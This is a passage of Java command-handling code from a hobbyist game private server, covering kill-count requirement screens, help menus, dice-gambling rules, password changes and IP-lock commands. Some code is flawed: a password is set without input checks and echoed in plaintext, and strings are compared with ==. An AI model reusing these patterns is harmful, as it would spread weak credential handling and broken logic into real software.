		player.getPackets().sendIComponentText(275, 48, "Super Poanizer - " +player.Po2Kills +" Kills");
		
		
		
		
	
	}
//end kills



//Comp Requirements
	if (cmd[0].equalsIgnoreCase("compreq") || cmd[0].equalsIgnoreCase("compcape")){
		
	String done1;
	String done2;
	String done3;
	String done4;
	String done5;
	String done6;
	String done7;
	String done8;
	String done9;
	String done10;
	String done11;
	String done12;
	String done13;
	String done14;
	String done15;
	String done16;
	String done17;
	String done18;
	String done19;
	String done20;
	String done21;
	String done22;
	String done23;
	String done24;
	String done25;
	String done26;
		
	//pvm checker
	if (player.BandosKills >= 100 ) {
	done1 = "<col=00FF00>";
	}
	else{
	done1 = "<col=FF0000>";
	
	}if (player.ZamyKills >= 100 ) { 
	done2 = "<col=00FF00>";
	}
	else{
	done2 = "<col=FF0000>";
	}if (player.SaraKills >= 100 ) { 
	done3 = "<col=00FF00>";
	}
	else{
	done3 = "<col=FF0000>";
	}if (player.ArmaKills >= 100 ) { 
	 done4 = "<col=00FF00>";
	}
	else{
	done4 = "<col=FF0000>";
	}if (player.KiwiKills >= 5 ) { 
	done5 = "<col=00FF00>";
	}
	else{
	done5 = "<col=FF0000>";	 
	}if (player.CorpKills >= 80 ) { 
	done6 = "<col=00FF00>";
	}
	else{
	done6 = "<col=FF0000>";
	}if (player.NexKills  >= 25 ) { 
	done7 = "<col=00FF00>";
	}
	else{
	done7 = "<col=FF0000>"; 
	}if (player.GlacorKills >= 40 ) {
	done8 = "<col=00FF00>";
	}
	else{
	done8 = "<col=FF0000>";
	}if (player.KBDKills >= 100 ) {
	done9 = "<col=00FF00>";
	}
	else{
	done9 = "<col=FF0000>";
	}if (player.TDKills >= 50 ) { 
	 done10 = "<col=00FF00>";
	}
	else{
	done10 = "<col=FF0000>";
	}if (player.AhrimKills >= 100 ) { 
	done11 = "<col=00FF00>";
	}
	else{
	done11 = "<col=FF0000>";
	}if (player.DHKills >= 100 ) { 
	done12 = "<col=00FF00>";
	}
	else{
	done12 = "<col=FF0000>";
	}if (player.GuthanKills >= 100 ) { 
	done13 = "<col=00FF00>";
	}
	else{
	done13 = "<col=FF0000>";
	}if (player.KarilKills >= 100 ) { 
	done14 = "<col=00FF00>";
	}
	else{
	done14 = "<col=FF0000>";
	}if (player.ToragKills >= 100 ) { 
	done15 = "<col=00FF00>";
	}
	else{
	done15 = "<col=FF0000>";
	}if (player.VeracKills >= 100 ) {
	 done16 = "<col=00FF00>";
	}
	else{
	done16 = "<col=FF0000>";
	}if (player.GanoKills >= 100 ) {
	 done17 = "<col=00FF00>";
	}
	else{
	done17 = "<col=FF0000>";
	}if (player.SupremeKills >= 30 ) {
	done18 = "<col=00FF00>";
	}
	else{
	done18 = "<col=FF0000>";
	}if (player.PrimeKills >= 30 ) {
	done19 = "<col=00FF00>";
	}
	else{
	done19 = "<col=FF0000>";
	}if (player.RexKills  >= 30 ) { 
	done20 = "<col=00FF00>";
	}
	else{
	done20 = "<col=FF0000>"; 
	}if (player.DestructionKills >= 20 ) { 
	done21 = "<col=00FF00>";
	}
	else{
	done21 = "<col=FF0000>";
	}if (player.NomadKills >= 50 ) {
	done22 = "<col=00FF00>";
	}
	else{
	done22 = "<col=FF0000>"; 
	}if (player.RevKills >= 100 )  { 
	 done23 = "<col=00FF00>";
	}
	else{
	done23 = "<col=FF0000>";
	}if (player.QBDKills >= 40 ) { 
	done24 = "<col=00FF00>";
	}
	else{
	done24 = "<col=FF0000>"; 
	}if (player.Po1Kills >= 10 ){
	done25 = "<col=00FF00>";
	}
	else{
	done25 = "<col=FF0000>"; 
	
	}if (player.Po2Kills >= 5 ){
	done26 = "<col=00FF00>";
	}
	else{
	done26 = "<col=FF0000>";	
		
	}
		
	//Interface
		player.getInterfaceManager().sendInterface(275);
		for (int i = 0; i < 316; i++){
		player.getPackets().sendIComponentText(275, i, " ");
		}
		
		player.getPackets().sendIComponentText(275, 2, "Completionist Cape");
		player.getPackets().sendIComponentText(275, 14, ".");
		
		player.getPackets().sendIComponentText(275, 17, "<col=FF0000>Have Requirments:  </col><col=0000F>" + String.valueOf(player.CompDone)+ "</col>");
		
		
		player.getPackets().sendIComponentText(275, 19, "PVM Kills Complete: " +String.valueOf(player.CompPvm));
	
		
		player.getPackets().sendIComponentText(275, 20, done1 + "Bandos - " +player.BandosKills +"/100 Kills");
		player.getPackets().sendIComponentText(275, 21, done2 + "Zamorak - " +player.ZamyKills +"/100 Kills");
		player.getPackets().sendIComponentText(275, 22, done3 + "Saradomin - " +player.SaraKills +"/100 Kills");
		player.getPackets().sendIComponentText(275, 23, done4 + "Armadyl - " +player.ArmaKills +"/100 Kills");

		player.getPackets().sendIComponentText(275, 25, done6 + "Corporeal Beast - " +player.CorpKills +"/80 Kills");
		player.getPackets().sendIComponentText(275, 26, done7 + "Nex - " +player.NexKills +"/25 Kills");
		player.getPackets().sendIComponentText(275, 27, done8 + "Glacors - " +player.GlacorKills +"/40 Kills");
		player.getPackets().sendIComponentText(275, 28, done22 + "Nomad - " +player.NomadKills +"/50 Kills");
		
		player.getPackets().sendIComponentText(275, 29, done9 + "King Black Dragon - " +player.KBDKills +"/100 Kills");
		player.getPackets().sendIComponentText(275, 30, done10 + "Tormented Demon - " +player.TDKills +"/50 Kills");
		player.getPackets().sendIComponentText(275, 31, done17 + "Ganodermic Beasts - " +player.GanoKills +"/100 Kills");
		player.getPackets().sendIComponentText(275, 32, done21 + "Avatar of Destruction - " +player.DestructionKills +"/20 Kills");
		player.getPackets().sendIComponentText(275, 33, done5 + "Steel kiwi - " +player.KiwiKills +"/5 Kills");
		player.getPackets().sendIComponentText(275, 34, done24 + "Queen Black Dragon - " +player.QBDKills +"/40 Kills");

		player.getPackets().sendIComponentText(275, 36, done11 + "Ahrim - " +player.AhrimKills +"/100 Kills");
		player.getPackets().sendIComponentText(275, 37, done12 + "Dharok - " +player.DHKills +"/100 Kills");
		player.getPackets().sendIComponentText(275, 38, done13 + "Guthans - " +player.GuthanKills +"/100 Kills");
		player.getPackets().sendIComponentText(275, 39, done14 + "Karil - " +player.KarilKills +"/100 Kills");
		player.getPackets().sendIComponentText(275, 40, done15 + "Torag - " +player.ToragKills +"/100 Kills");
		player.getPackets().sendIComponentText(275, 41, done16 + "Verac - " +player.VeracKills +"/100 Kills");
		
		player.getPackets().sendIComponentText(275, 43, done18 + "Dagannoth Supreme - " +player.SupremeKills +"/30 Kills");
		player.getPackets().sendIComponentText(275, 44, done19 + "Dagannoth Prime - " +player.PrimeKills +"/30 Kills");
		player.getPackets().sendIComponentText(275, 45, done20 + "Dagannoth Rex - " +player.RexKills +"/30 Kills");

		player.getPackets().sendIComponentText(275, 47, done23 + "Revenants - " +player.RevKills +"/100 Kills");
		
		
		player.getPackets().sendIComponentText(275, 49, done25 + "Poanizer - " +player.Po1Kills +"/10 Kills");
		player.getPackets().sendIComponentText(275, 50, done26 + "Super Poanizer - " +player.Po2Kills +"/5 Kills");
		
		
		
		
		player.getPackets().sendIComponentText(275, 53,  "Prestige: - " +player.prestige +"/10");
		
//SKILLING FOR COMP
int row = 54;
for(int i = 0; i < 24; i++){
String done = "";

double xp = player.getSkills().getXp(i);
String skillxp = String.valueOf(xp);


//if the string of the skills xp is 200m it will print complete else it will say how much out of 200m
if(skillxp == "2.0E8"){
	done = "<col=00FF00> Complete";
}
else{
	done = skillxp + "/200m";
}

player.getPackets().sendIComponentText(275,row,  "row"  + "Skill " + String.valueOf(i) + ": Done:" + String.valueOf(done) + "skillxp" + String.valueOf(skillxp));
row ++;
}

/*+ 
player.getSkills().getXp(1) + 
player.getSkills().getXp(2) + 
player.getSkills().getXp(3) + 
player.getSkills().getXp(4) + 
player.getSkills().getXp(5) +
player.getSkills().getXp(6) +
player.getSkills().getXp(7) +
player.getSkills().getXp(8) +
player.getSkills().getXp(9) +
player.getSkills().getXp(10) +
player.getSkills().getXp(11) +
player.getSkills().getXp(12) +
player.getSkills().getXp(13) +
player.getSkills().getXp(14) +
player.getSkills().getXp(15) +
player.getSkills().getXp(16) + 
player.getSkills().getXp(17) + 
player.getSkills().getXp(18) + 
player.getSkills().getXp(19) + 
player.getSkills().getXp(20) + 
player.getSkills().getXp(21) + 
player.getSkills().getXp(22) + 
player.getSkills().getXp(23)
*/
	
	
	
	}

//end of kills		
		if (cmd[0].equalsIgnoreCase("commands") || cmd[0].equalsIgnoreCase("cmd")){
		player.getInterfaceManager().sendInterface(275);
		for (int i = 0; i < 316; i++){
		player.getPackets().sendIComponentText(275, i, " ");
		}
		player.getPackets().sendIComponentText(275, 2, "The Poanizer Project's Commands");
		player.getPackets().sendIComponentText(275, 14, "Go To Website");
		player.getPackets().sendIComponentText(275, 16, "Places COMMANDS");
		
		
		player.getPackets().sendIComponentText(275, 17, "::kking --------- Teleports you to Kalphite King (Team Boss)");
		player.getPackets().sendIComponentText(275, 18, "::kq    --------------------------------------  Kalphite Queen");
		player.getPackets().sendIComponentText(275, 19, "::bork  ------------------------------------------------  Bork");
		player.getPackets().sendIComponentText(275, 20, "::polypore  --------------------------------  Polypore Dungeon");
		player.getPackets().sendIComponentText(275, 21, "::jadinko ------------------------------------ Jadinko Dungeon");
		player.getPackets().sendIComponentText(275, 22, "::jad  -------------------------------------  The Tzhaar Caves");
		player.getPackets().sendIComponentText(275, 23, "::corp ------------------------------------- Corporal Entrance");
		player.getPackets().sendIComponentText(275, 24, "::nex  ----------------------------------------------- The Nex");
		player.getPackets().sendIComponentText(275, 25, "::brimhaven -------------------------------- Brimhaven Dungeon");
		player.getPackets().sendIComponentText(275, 26, "::train  -----------------------------------------  Rock Crabs");
		player.getPackets().sendIComponentText(275, 27, "::train2 --------------------- Taverly Dungeon Near HellHounds");
		player.getPackets().sendIComponentText(275, 28, "::barrows --------------------------- Teleports you to Barrows"); 
		player.getPackets().sendIComponentText(275, 29, "::Home ------------------------------------ Teleports you Home");
		player.getPackets().sendIComponentText(275, 30, "::taverly ------------ Takes you to Taverly Dung, Ghosts There");
		player.getPackets().sendIComponentText(275, 31, "::icefiends --------------------------- Takes you to Icefiends");
		player.getPackets().sendIComponentText(275, 32, "::slayertower ------------------ Takes you to the Slayer Tower");
		player.getPackets().sendIComponentText(275, 33, "::nomad ------------------------- Takes you to the Nomads Lair");
		player.getPackets().sendIComponentText(275, 34, "::glacors --------------------------- Takes you to the Glacors");
		player.getPackets().sendIComponentText(275, 35, "::TrollQ -------------------- Takes you to the Sea Troll Queen");
		player.getPackets().sendIComponentText(275, 36, "::DKS ----------------------- Takes you to the Dagonnoth Kings"); 
		player.getPackets().sendIComponentText(275, 38, "Other teleports are at Mr. Ex and Max at home!");
		
		player.getPackets().sendIComponentText(275, 41, "Other Help Full Commands");
		player.getPackets().sendIComponentText(275, 42, "::yell ---------------------------  Allows you to talk Globally");
		player.getPackets().sendIComponentText(275, 43, "::ChangePass ----------------------------  Can Change your pass");
		player.getPackets().sendIComponentText(275, 44, "::vote -----------------------------  Takes you to voting site.");
		player.getPackets().sendIComponentText(275, 45, "::Youtube ---------------------- Links you to s Youtube");
		player.getPackets().sendIComponentText(275, 46, "::donate -------------------  Donating rewards and instructions");
		player.getPackets().sendIComponentText(275, 47, "::players -----------------  Shows you the amount of players on");
		player.getPackets().sendIComponentText(275, 48, "::helpme ---------  Rule Breaker Hidden Admin Call: DONT ABUSE!");
		player.getPackets().sendIComponentText(275, 49, "::xpoff/xpon -----------------  Turns on XPLock and Off XPLOCK!");
		player.getPackets().sendIComponentText(275, 50, "::Rules ---------------------- Shows the rules of The Poanizer Project");
		
		player.getPackets().sendIComponentText(275, 52, "Skilling Commands");
		player.getPackets().sendIComponentText(275, 54, "::theive ---------------------- Takes you to the best thieving.");
		player.getPackets().sendIComponentText(275, 55, "::mine ---------------------- Takes you to the mining location.");
		player.getPackets().sendIComponentText(275, 56, "::fish -----------------------  Takes you to the fishing place.");
		player.getPackets().sendIComponentText(275, 57, "::dung ------------------------------  Takes you to Daemonheim.");
		player.getPackets().sendIComponentText(275, 58, "::farming ---------------  Takes you to Catherby Farming Patch.");
		player.getPackets().sendIComponentText(275, 59, "::Donatorzone -------------------  Teleports you to Donatorzone");
		player.getPackets().sendIComponentText(275, 60, "::runecraft ------------ the command for going to runecrafting.");
		player.getPackets().sendIComponentText(275, 60, "::construction --------- the command for going to runecrafting.");
		
		player.getPackets().sendIComponentText(275, 62, "PVP Commands");			
		player.getPackets().sendIComponentText(275, 64, "::revs --------- Teleports you to Revenants Safe. Multi PVP+PVM.");
		player.getPackets().sendIComponentText(275, 65, "::AvatarD ---------- Teleports you to the Avatar of Destuction.");
		player.getPackets().sendIComponentText(275, 66, "::Easts ------------------------------------- East dragons pvp.");
		player.getPackets().sendIComponentText(275, 67, "::Wests ------------------------------------- West dragons pvp.");
		player.getPackets().sendIComponentText(275, 68, "::Ruins ------------------------ Clan wars Red portal teleport.");
		player.getPackets().sendIComponentText(275, 69, "::Pvp ----------------------------- Takes you to edgeville pvp.");
		player.getPackets().sendIComponentText(275, 70, "::Multi ------------------------- Multi pvp at the chaos altar.");
		
		player.getPackets().sendIComponentText(275, 75, "Custom Emote Commands.");
		player.getPackets().sendIComponentText(275, 77, "::Buff ---------------------------------------------- Push ups.");
		player.getPackets().sendIComponentText(275, 78, "::Runit ------------------------------------------ Jog on Spot.");			
		player.getPackets().sendIComponentText(275, 79, "::Stars ------------------------------------------- Star Jumps.");			
		player.getPackets().sendIComponentText(275, 80, "::Situp ---------------------------------------------- Sit Ups.");			
		player.getPackets().sendIComponentText(275, 81, "::Bow --------------------------------------- Bow to the Owner.");
		player.getPackets().sendIComponentText(275, 82, "::Facefloor --------------------------------------- Dat' Floor.");
		
		player.getPackets().sendIComponentText(275, 83, "::UnSorted Commands.");
		player.getPackets().sendIComponentText(275, 84, "::Home ------------------------------------ Teleports you Home.");
		player.getPackets().sendIComponentText(275, 85, "::Skull ---------------------------- Makes you Skulled for PvP.");			
		player.getPackets().sendIComponentText(275, 86, "::Killme --------------------------- Kills you. May drop items.");			
		player.getPackets().sendIComponentText(275, 87, "::Resetprestige --------------------- Resets your prestige to 0");			
		player.getPackets().sendIComponentText(275, 88, "::Logout -------------------- Logs you out. Alternative method.");
		player.getPackets().sendIComponentText(275, 89, "::Ticket --------------------- Opens a Support ticket to staff.");
		player.getPackets().sendIComponentText(275, 90, "::Taverly ----------------------- Takes you to Taverly Dungeon.");
		player.getPackets().sendIComponentText(275, 91, "::Hunt ------------------------ Teleports you to the Hunter Zo.");
		player.getPackets().sendIComponentText(275, 92, "::Score/kdr ------------------ Shows your Kills to Death Ratio.");
		player.getPackets().sendIComponentText(275, 93, "::Players2 --------------- Shows online player count with text.");
		player.getPackets().sendIComponentText(275, 94, "::Help ------------------ Gives you a semi pointless help book.");
		player.getPackets().sendIComponentText(275, 95, "::Title ----------------------------------- Changes your title.");
		player.getPackets().sendIComponentText(275, 96, "::Blueskin ------------------------- Changes your skin to Blue.");
		player.getPackets().sendIComponentText(275, 97, "::Greenskin ---------------------- Changes your sking to Green.");
		player.getPackets().sendIComponentText(275, 98, "::Resatk ----------------------------- Resets your Attack to 1.");
		player.getPackets().sendIComponentText(275, 99, "::Resdef ---------------------------- Resets your Defence to 1.");
		player.getPackets().sendIComponentText(275, 100, "::Resstr ---------------------------------- Resets your X to 1");
		player.getPackets().sendIComponentText(275, 101, "::Resmage --------------------------------- Resets your X to 1");
		player.getPackets().sendIComponentText(275, 102, "::ResRange -------------------------------- Resets your X to 1");
		player.getPackets().sendIComponentText(275, 103, "::Reshp ----------------------------------- Resets your X to 1");
		player.getPackets().sendIComponentText(275, 104, "::Resprayer ------------------------------- Resets your X to 1");
		player.getPackets().sendIComponentText(275, 105, "::Resdung --------------------------------- Resets your X to 1");
		player.getPackets().sendIComponentText(275, 106, "::Dice ---------------------- Teleports you to the dicing Zone");
		player.getPackets().sendIComponentText(275, 108, "::Tzhaar -------------------- Teleports you to the Tzhaar Cave");
		player.getPackets().sendIComponentText(275, 109, "::Miths --------------------- Teleports you to Mithril Dragons");
		player.getPackets().sendIComponentText(275, 110, "::Frosts ------------ Teleports you to Frost Dragons ");
		player.getPackets().sendIComponentText(275, 111, "::Wyvern --------- Teleports you to Skeletal Wyverns");
		player.getPackets().sendIComponentText(275, 112, "::Donatorboss ---- Teleports you to the Donator Boss");
		player.getPackets().sendIComponentText(275, 113, "::Locust -------- Pointless teleport to the end of the desert.");
		player.getPackets().sendIComponentText(275, 114, "::Sexythang ----------------------------- Makes you look SEXY!");
		player.getPackets().sendIComponentText(275, 115, "::Unsexy --------------------------- Turns you back to normal.");
		player.getPackets().sendIComponentText(275, 116, "::Startpvp --------------------------- Edgeville Safe PVP Beta");
		player.getPackets().sendIComponentText(275, 117, "::Thezone ---------------------------- Takes you to 'The Zone'");
		player.getPackets().sendIComponentText(275, 118, "::Dragons --------------------------- Teleports you to Dragons");
		player.getPackets().sendIComponentText(275, 119, "::testx ----- Teleports you to s test zone");
		player.getPackets().sendIComponentText(275, 120, "::test(1-20) ----- Teleports you to s test areas");
		player.getPackets().sendIComponentText(275, 123, "::Commands --------------------------------------- Shows this.");
		player.getPackets().sendIComponentText(275, 124, "::Dicerules ------- Shows the rules for dicing.");
		player.getPackets().sendIComponentText(275, 125, "::Beard ----------- Opens the Hair/Beard interface. Doesnt work.");
		player.getPackets().sendIComponentText(275, 126, "::Ruins ----------------- Teleports you to DANGEROUS Clan Wars");
		player.getPackets().sendIComponentText(275, 128, "::Duel------------------------ Teleports you to the Duel Arena");
		player.getPackets().sendIComponentText(275, 129, "::Castlewars -------- Teleports you to castle wars.");
		player.getPackets().sendIComponentText(275, 130, "::Hardestbossnz ------------------------------------ Goodluck.");
		player.getPackets().sendIComponentText(275, 131, "::Clanwars    ---------- Teleport to Clanwars in gamers grotto");
		player.getPackets().sendIComponentText(275, 132, "::Chickens    ---------- Teleport to Evil Chickens");
		player.getPackets().sendIComponentText(275, 133, "::Slayertower ------------------ Takes you to the Slayer Tower");
		player.getPackets().sendIComponentText(275, 134, "::Slayertower2 ------------ Takes you to the 2nd floor on Slayer Tower");
		player.getPackets().sendIComponentText(275, 135, "::Slayertower3 ------------ Takes you to the 3rd floor on Slayer Tower");
		
		player.getPackets().sendIComponentText(275, 137, "More CMD's.");
		player.getPackets().sendIComponentText(275, 139, "::Shank    ---------- A shank or a hug?");
		player.getPackets().sendIComponentText(275, 140, "::Feel    ---------- Whats that feel like?");
		player.getPackets().sendIComponentText(275, 141, "::Harlemshake    ------ Con los Terroristas!");
		player.getPackets().sendIComponentText(275, 142, "::Blar    ---------- Get up close and personal");
		player.getPackets().sendIComponentText(275, 143, "::unemote    ---------- Stops custom emote.");
		player.getPackets().sendIComponentText(275, 144, "::Slayerpoints ---------- Shows your current slayerpoints");
		
		
		player.getPackets().sendIComponentText(275, 146, "Enables/Disables");
		
		player.getPackets().sendIComponentText(275, 147, "::lvlmesson ------------ turns the leveling messages off.");
		player.getPackets().sendIComponentText(275, 148, "::lvlmessoff ------------ turns the leveling messages off.");
		player.getPackets().sendIComponentText(275, 149, "::plistoff ---------- disables the list of players on login.");
		player.getPackets().sendIComponentText(275, 150, "::pliston ---------- enables the list of players on login.");
		player.getPackets().sendIComponentText(275, 151, "::dmessoff ---------- disables donator rank info on login.");
		player.getPackets().sendIComponentText(275, 152, "::dmesson ---------- enables donator rank info on login.");
		player.getPackets().sendIComponentText(275, 153, "::logminmessoff ---------- disables the login messages.");
		player.getPackets().sendIComponentText(275, 154, "::logminmesson ---------- enables the login messages.");
		
		
		player.getPackets().sendIComponentText(275, 156, "::securityinfo ---------- Opens the Information about keeping your account secure.");
		player.getPackets().sendIComponentText(275, 157, "::iplock ---------- Opens the interface to enable your IPLock.");
		player.getPackets().sendIComponentText(275, 158, "::ipunlock ---------- Opens the interface to disable your IPLock.");
		player.getPackets().sendIComponentText(275, 159, "::amilocked ---------- Shows whether you have IPLock On or Off.");
		player.getPackets().sendIComponentText(275, 160, "::disablelocking ---------- Disables IPlock for your account. Admins must re enable.");
		player.getPackets().sendIComponentText(275, 161, "::iplockstatus ---------- Shows the status of all Iplock Variables.");
		
		player.getPackets().sendIComponentText(275, 163, "::wguild ---------- takes you to the warriors guild.");
		player.getPackets().sendIComponentText(275, 164, "::stopkc ---------- stops the counter.");
		player.getPackets().sendIComponentText(275, 165, "::resetkc ---------- resets the counter to 1.");
		player.getPackets().sendIComponentText(275, 166, "::unlockmusic ---------- sets it so you unlock music.");
		player.getPackets().sendIComponentText(275, 167, "::unlockmusicoff ---------- turns off unlocking music.");
	
	}
		
		//END @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
		
		if (cmd[0].equalsIgnoreCase("dicerules")){
		player.getInterfaceManager().sendInterface(275);
		for (int i = 0; i < 316; i++){
		player.getPackets().sendIComponentText(275, i, " ");
		}
		player.getPackets().sendIComponentText(275, 2, "Dice Rules (non of the rules are Enforced atm)");
		player.getPackets().sendIComponentText(275, 14, "Go To Forum");
		player.getPackets().sendIComponentText(275, 18, "Anyone that doesnt follow the rules will be banned from Hosting.");
		player.getPackets().sendIComponentText(275, 19, " You must be Ranked in 'Dice' Friends chat.");			
		player.getPackets().sendIComponentText(275, 20, "You must follow these rules. There is no 'Im host my rules'.");
		player.getPackets().sendIComponentText(275, 21, "DO NOT bet anything you cant pay out. If you cant pay out dont host.");
		
		
		player.getPackets().sendIComponentText(275, 23, "Ranks. ");
		player.getPackets().sendIComponentText(275, 24, "All donators recieve recruit when they obtain there dice bag.");
		player.getPackets().sendIComponentText(275, 25, "To upgrade your rank you must pay a member of Staff Global Mod+");
		player.getPackets().sendIComponentText(275, 26, "You buy ranks with ingame coins. NOT items.");
		
		player.getPackets().sendIComponentText(275, 28, "Different Game Rules.");
		
		player.getPackets().sendIComponentText(275, 30, "Yet again you MUST follow these rules.");
		player.getPackets().sendIComponentText(275, 31, "If you have a different or a new dice game tell a member of staff.");
	
		
		player.getPackets().sendIComponentText(275, 33, "55x2");
		
		player.getPackets().sendIComponentText(275, 35, "If the host rolls OVER 55, the host loses.");
		player.getPackets().sendIComponentText(275, 36, "If the host rolls UNDER 55 then the host MUST pay out.");
		player.getPackets().sendIComponentText(275, 37, "If the host rolls 55 then the host MUST pay out. ");
		
		player.getPackets().sendIComponentText(275, 39, "Dice Duels.");
		
		player.getPackets().sendIComponentText(275, 41, "DO NOT roll untill you have recieved the bet.");
		player.getPackets().sendIComponentText(275, 42, "You each take turns rolling the dice. You roll for a total of 3 times.");
		player.getPackets().sendIComponentText(275, 43, "Who ever rolls the highest 3 rolls wins the money.");
		player.getPackets().sendIComponentText(275, 44, "If you Double roll You AUTOMATICLY lose the duel and our opponent wins.");
		
		
		player.getPackets().sendIComponentText(275, 46, "------------------------------------------------------------------------------------------");
		player.getPackets().sendIComponentText(275, 47, "You MUST follow these rules or else you will be banned from hosting.");
		player.getPackets().sendIComponentText(275, 48, "It is always good to take screenshots of any bet you are worried about.");
		player.getPackets().sendIComponentText(275, 49, "Its even better to Record your whole bet with video if you feel the need.");
		player.getPackets().sendIComponentText(275, 50, "Always State What the Payment you want if Betting Items.");
		player.getPackets().sendIComponentText(275, 51, "Dont assume you will get what you expect, If its not stated then it counts.");
		player.getPackets().sendIComponentText(275, 52, "EXAMPLE: If you bet a BCP but dont state that you want a BCP for BCP....");
		player.getPackets().sendIComponentText(275, 53, "the Host can give you any Items equal to or greater in Value.");
		player.getPackets().sendIComponentText(275, 54, "Players cannot Roll for other players. The person with the Rank must Host.");
		
		player.getPackets().sendIComponentText(275, 56, "These rules were made By Poanizer");
		player.getPackets().sendIComponentText(275, 57, "If you disagree with any of these rules. Please post why on forums");
		player.getPackets().sendIComponentText(275, 58, "Or contact a member of staff to change them.");
		player.getPackets().sendIComponentText(275, 59, "Even if your unhappy with these rules you MUST still follow them.");
		
		
	
		}
		if (cmd[0].equals("beard")) {
			PlayerLook.openBeardInterface(player);
			return true;
		}
		
		
		
		
		if (cmd[0].equalsIgnoreCase("changepassword")) {
			if (cmd[1].length() > 15) {
				player.getPackets().sendGameMessage("You cannot set your password to over 15 chars.");
				return true;
			}
			player.setPassword(cmd[1]);
			player.getPackets().sendGameMessage("You changed your password! Your password is " + cmd[1] + ".");
			

		
		}
		
			
			
					
			
			if (cmd[0].equalsIgnoreCase("yell")) {
				String message = "";
				for (int i = 1; i < cmd.length; i++)
					message += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
	
				sendYell(player, Utils.fixChatMessage(message), false);
				
				//return true;
				try {
					File file = new File("data/logs/yelled.txt");
					BufferedWriter writer = new BufferedWriter(new FileWriter(
							file, true));
					writer.write ("[" + DateFormat.getDateTimeInstance().format(new Date()) + "]" + player.getDisplayName() + "[ Yelled ]" + message);
					writer.newLine();
					writer.flush();
				} catch (IOException e) {
					e.printStackTrace();
				}
				
				
				return true;
				
				
			}
			
				 if(cmd[0].equalsIgnoreCase("players")){
                                int number = 0;
                                        for (int i = 0; i < 316; i++) {
                                player.getPackets().sendIComponentText(275, i, "");
                                }
                                for(Player p5 : World.getPlayers()) {
                                        if(p5 == null)
                                                continue;
                                        number++;
                                        String titles = "";
					if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[<img=15]<col=1589FF>Le_Snuff</col>]"; 
					}else if (p5.getUsername().equalsIgnoreCase("joe")) {
                        			titles = "[<col=FFFF00>[Owner And Coder]</col> ] - <img=8> "; 
					
						}else if (p5.getUsername().equalsIgnoreCase("mike")) {
                        			titles = "[<col=FFFF00>[Co Owner]</col> ] - <img=8> "; 
					}else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[<col=FFFF00>[Admin]</col> ] - <img=8> "; 
					} else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[<col=FFFF00>[Owner]</col> ] - <img=8> "; 
					} else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[<col=F859A>[Owner]</col> ] - <img=8> "; 
					} else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[<col=FFFF00></col> ] - <img=8> "; 
					} else if (p5.getUsername().equalsIgnoreCase("")) {
                        			titles = "[ <col=ff0000></col> ] - <img=8> ";
					} else if (p5.getRights() == 13) { 
                        			titles = "[ <col=00ffe4>Trusted Player</col> ] - <img=15> ";
					} else if (p5.getRights() == 12) { 
                        			titles = "[ <col=9c2929>Not a Real Owner</col> ] - <img=1> ";
					} else if (p5.getRights() == 11) { 
                        			titles = "[	<col=660066>Developer</col> ]- <img=1> ";
					} else if (p5.getRights() == 10) { 
                        			titles = "[ <col=9c2929>Admin</col> ] - <img=1> ";
					} else if (p5.getRights() == 8) {
                        			titles = "[ <col=660066>Global Moderator</col> ] - <img=1> ";
					} else if (p5.getRights() == 7) {
                        			titles = "[ <col=FF8000>Moderator</col> ] - <img=0> ";
					} else if (p5.getRights() == 6) {
                        			titles = "[ <col=00449c>Player Support</col> ] - <img=9> ";
					} else if (p5.getRights() == 5) {
                        			titles = "[<col=FFF00>Forum Moderator</col>]- <img=6> ";
					
					} else if (p5.getRights() == 1) {
                                		titles = "[ <col=FF00FF>Donator</col> ] - <img=10> ";	
					} else if (p5.getRights() == 2) {
                        			titles = "[ <col=FF00FF>Super Donator</col> ] - <img=11> ";	
					} else if (p5.getRights() == 3) {
                        			titles = "[ <col=FF00FF>Respected Donator</col> ] - <img=12> ";	
					} else if (p5.getRights() == 0) { 
                        			titles = "[ Player ] - ";
					} else if (p5.getRights() == 9) { 
                        			titles = "[ Player ] - ";
					
                                                }
                                                player.getPackets().sendIComponentText(275, 2, "");
                                        player.getPackets().sendIComponentText(275, (16+number), titles + ""+ p5.getDisplayName());
                                }
                                player.getPackets().sendIComponentText(275, 14, "<u=000080>The Poanizer Project  Players</u>");
                                player.getPackets().sendIComponentText(275, 16, "Players Online: "+number);
                                player.getPackets().sendIComponentText(275, 2, "Players Online");
                                player.getInterfaceManager().sendInterface(275);
                                player.getPackets().sendGameMessage("There are currently " + World.getPlayers().size() + " players playing " + Settings.SERVER_NAME+ ".");
                                return true;

			}						
			
			 if(cmd[0].equalsIgnoreCase("iplock")){
			 if (player.disablelocking == false){
				if (player.iplocked == true){
				player.getPackets().sendIComponentText(21, 1, "You have already locked your account on: " + player.lockedwith);
				player.getInterfaceManager().sendInterface(21);
				}else{
				String playerip = player.getSession().getIP();
				player.getPackets().sendIComponentText(204, 9, "Secure your Account with Ip Lock?");
				player.getPackets().sendIComponentText(204, 30, "Lock to");
				player.getPackets().sendIComponentText(204, 46, playerip);
				player.getPackets().sendIComponentText(204, 62, "?");
				player.getPackets().sendIComponentText(204, 22, "Confirm");
				player.getInterfaceManager().sendInterface(204);
				player.unlocking = false;
				}
			
			}else{
				player.getPackets().sendGameMessage("You have disabled the use of iplock for your account. Contact an Admin to enable this.");
											
				}
				}
			
				 if(cmd[0].equalsIgnoreCase("ipunlock")){
				if (player.iplocked == true){
				player.unlocking = true;
				String playerip = player.getSession().getIP();
				player.getPackets().sendIComponentText(204, 9, "Do you want to disable your IPLock");
				player.getPackets().sendIComponentText(204, 30, "Unlock:");
				player.getPackets().sendIComponentText(204, 46, player.lockedwith);
				player.getPackets().sendIComponentText(204, 62, "?");
				player.getPackets().sendIComponentText(204, 22, "Confirm");
				player.getInterfaceManager().sendInterface(204);
				}else{
				
				
				player.getPackets().sendIComponentText(21, 1, "You havnt set an IPLock. Type ::iplock");
				player.getInterfaceManager().sendInterface(21);
				}
				
		}
	
			
			
			
			if(cmd[0].equalsIgnoreCase("amilocked")){
				if (player.iplocked == true){
				player.getPackets().sendGameMessage("You have locked your account on: <shad=000><col=ff0000>" + player.lockedwith);               
				}else{
				player.getPackets().sendGameMessage("You havn't Ip Locked your account. Type ::securityinfo for more information");               
				
				}
